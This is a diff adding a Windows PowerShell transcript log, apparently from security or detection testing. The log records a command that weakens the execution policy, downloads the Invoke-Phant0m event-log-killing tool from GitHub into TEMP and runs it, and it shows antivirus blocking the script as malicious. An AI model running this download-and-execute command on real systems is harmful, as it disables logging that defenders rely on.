@@ -1,0 +1,47 @@
+﻿**********************
+Windows PowerShell 脚本开始
+开始时间: 20230415175607
+用户名: DESKTOP-SP5BHV2\wangjian
+RunAs 用户: DESKTOP-SP5BHV2\wangjian
+配置名称: 
+计算机: DESKTOP-SP5BHV2 (Microsoft Windows NT 10.0.19044.0)
+主机应用程序: powershell.exe & {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+$output = "$env:TEMP\Invoke-Phant0m.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+cd $env:TEMP
+Import-Module .\Invoke-Phant0m.ps1
+Invoke-Phant0m}
+进程 ID: 3504
+PSVersion: 5.1.19041.2673
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.19041.2673
+BuildVersion: 10.0.19041.2673
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+PS>. 'C:\Users\wangjian\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1'
+PS>& {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
+$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
+$output = "$env:TEMP\Invoke-Phant0m.ps1"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url, $output)
+cd $env:TEMP
+Import-Module .\Invoke-Phant0m.ps1
+Invoke-Phant0m}
+所在位置 行:1 字符: 1
++ & {Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSign ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+此脚本包含恶意内容，已被你的防病毒软件阻止。
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+PS>$global:?
+True
+**********************
+Windows PowerShell 脚本结束
+结束时间: 20230415175608
+**********************
